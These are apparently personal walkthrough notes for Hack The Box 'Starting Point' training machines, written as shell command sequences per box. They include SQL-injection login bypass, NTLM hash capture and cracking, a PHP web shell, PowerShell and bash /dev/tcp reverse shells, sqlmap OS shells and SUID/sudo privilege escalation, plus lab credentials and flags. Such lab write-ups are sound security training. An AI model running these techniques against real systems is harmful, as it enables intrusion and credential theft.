# starting point machines

## Meow

```shell
sudo namp -sN -A <ip_address> -v
telnet <ip_address>
username: root
cat flag.txt
```

## Fawn

```shell
sudo nmap -sN -A <ip_address> -v
ftp <ip_address>
username: anonymous
get flag.txt
exit
cat flag.txt
```

## Dancing

```shell
sudo nmap -sN -A <ip_address> -v
sudo nmap -A <ip_address> -
smbclient -L <ip_address>
smbclient //<ip_address>/WorkShares
cd James.P
get flag.txt
```

## Redeemer

```shell
sudo nmap -A -p1-9000 <ip_address>
sudo apt-get install redis -y
redis-cli -h 10.129.107.1
info
select 0
keys *
get flag
```

## Appointment

```shell
sudo nmap -sN -A <ip_address>
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# Web Login Credentials
# username: admin'#
```

## Sequel 

```shell
sudo nmap -sN -A <ip_address>
mysql --user=root --host=<ip_address> --port=3306
show databases;
use htb;
select * From config;
```

## Crocodile

```shell
sudo nmap -sN -A <ip_address>
ftp 10.129.107.34 
# Username: anonymous
get allowed.userlist
# useername: admin
get allowed.userlist.passwd
# password: rKXM59ESxesUFHAd
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt --url <ip_address>
# find login.php
<ip_address>/login.php
# username: admin
# password: rKXM59ESxesUFHAd
```

## Responder

```shell
sudo nmap -sN -A <ip_address>
<ip_address>
echo "<ip_address> unika.htb" >> /etc/hosts
# http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
sudo responder -I tun0
# http://unika.htb/index.php?page=//10.10.14.201/file
echo " Administrator::RESPONDER:9edb562faa3ed546:DDB8D25C0B447C1AA3C01E830C713738:010100000000000080C00D5464CADC019BAC598CCADDBE2F0000000002000800460037005A004F0001001E00570049004E002D004500350041004A004A0057005500340045004A00510004003400570049004E002D004500350041004A004A0057005500340045004A0051002E00460037005A004F002E004C004F00430041004C0003001400460037005A004F002E004C004F00430041004C0005001400460037005A004F002E004C004F00430041004C000700080080C00D5464CADC0106000400020000000800300030000000000000000100000000200000BC712D28AD8E105EBEC3ED565C5A255D4A2A4525B4771A13985237135675DF2B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300031000000000000000000" >> responder.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt responder.
sudo evil-winrm -U Administrator -p badminton -i <ip_address>
cd C:\Users\mike\Desktop
type flag.txt
```

## Three

```shell
sudo nmap -sN -A <ip_address>
echo "<ip_address> thetoppers.htb" >> /etc/hosts
sudo wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u <ip_address>/
s3.thetoppers.htb
sudo apt-get install awscli -y
echo "<ip_adress> s3.thetoppers.htb" >> /etc/hosts
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
echo '<?php system($_GET["cmd"]); ?>' >> shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
http://thetoppers.htb/shell.php?cmd=ls
http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
```

## Archetype

```shell
sudo nmap -A <ip_address>
smbclient -L <ip_address>
smbclient //<ip_address>/backups
get prod.dtsConfig
User:sql_svc
Password: M3g4c0rp123
Hostname: ARCHETYPE
sudo apt-get install pipx
python3 -m pipx install impacket
# https://github.com/fortra/impacket/tree/master
mssqlclient.py ARCHETYPE/sql_svc:'M3g4c0rp123'@<ip_address> -windows-auth
help
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell whoami
https://www.revshells.com/ (Powershell #3 base64)
xp_cmdshell powershell -e <base_64_code>
nc -lvnp 9001 (Host machine)
cd C:\Users\sql_svc\Desktop
type user.txt
# user flag: 3e7b102e78218e935bf3f4951fec21a3
mkdir peas
cd peas
wget https://github.com/peass-ng/PEASS-ng/releases/download/20260422-9567fd62/winPEASx64.exe (On local machine)
python3 -m http.server (on local machine)
wget http://<ip_host>/winPEASx64.exe -outfile winPEASx64.exe
.\winPEASx64.exe
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
psexec.py administrator@<ip_address>
cd C:\Users\Administrator\Destop
type root.txt
#root flag: b91ccec3305e98240082d4474b848528
```

## Oopsie

```shell
http://<ip_address>/cdn-cgi/login
# use burpsuite 
# change id from 2 to 1
http://<ip-address>/cdn-cgi/login/admin.php?content=accounts&id=1
# change role to admin and id to 34322
# wfuzz will flag /uploads
./directorysearch.sh --wfuzzdir <ip_address>
http://<ip_address>/uploads/php-reverse-shell.php
cp /usr/share/webshells/php/php-revere-shell.php
# change ip address and port
nc -lvnp 9001
cd /home/robert
cat user.txt
# user flag: f2c74ee8db7983851ab2a96a44eb7981
cat /var/www/html/cdn-cgi/login/db.php
# $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
find / -group bugtracker 2>/dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
# must be in bash shell
su robert
# password: M3g4C0rpUs3r!
./usr/bin/bugtracker
file bugtracker
# Set UID (Set owner User ID)
cd /tmp
echo "/bin/sh" >> cat
cd /usr/bin
export PATH=/tmp:$PATH
./bugtracker
view /root/root.txt
# root flag: af13b0bee69f8a877c3faf667f7beacf
```

## Vaccine

```shell
./networkscan.sh -- quick <ip_address>
./networkscan.sh --slow <ip_address>
ftp anonymous@<ip_address>
get backup.zip
zip2john backup.zip > hash.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
sudo john --show hash.txt
# password: 741852963 for backup.zip 
cat index.php
# md5 password: 2cb42f8734ea607eefed3b70af13bbd3
#username: admin
# md5 decrypt password: qwerty789
sqlmap -u 'http://<ip_address>/dashboard.php?search=any+query' --cookie="PHPSESSID=7r5b6fefjq2a8nllra8thukft7" --os-shell
cat ../../user.txt
# User flag: ec9b13ca4d6229cd5cc1e09980965bf7
bash -c "bash -i >& /dev/tcp/<host_ip>/9001 0>&1"
nc -lvnp 9001
python3 -c 'import pty;pty.spawn("/bin/bash")'
cat /var/www/html/dashboard.php | grep -i pass
# $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!")
sudo -l
# password: P@s5w0rd!
# (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:set shell=/bin/sh
:shell
cat /root/root.txt
# root flag: dd6e058e814260bc70e9bbdef2715849
```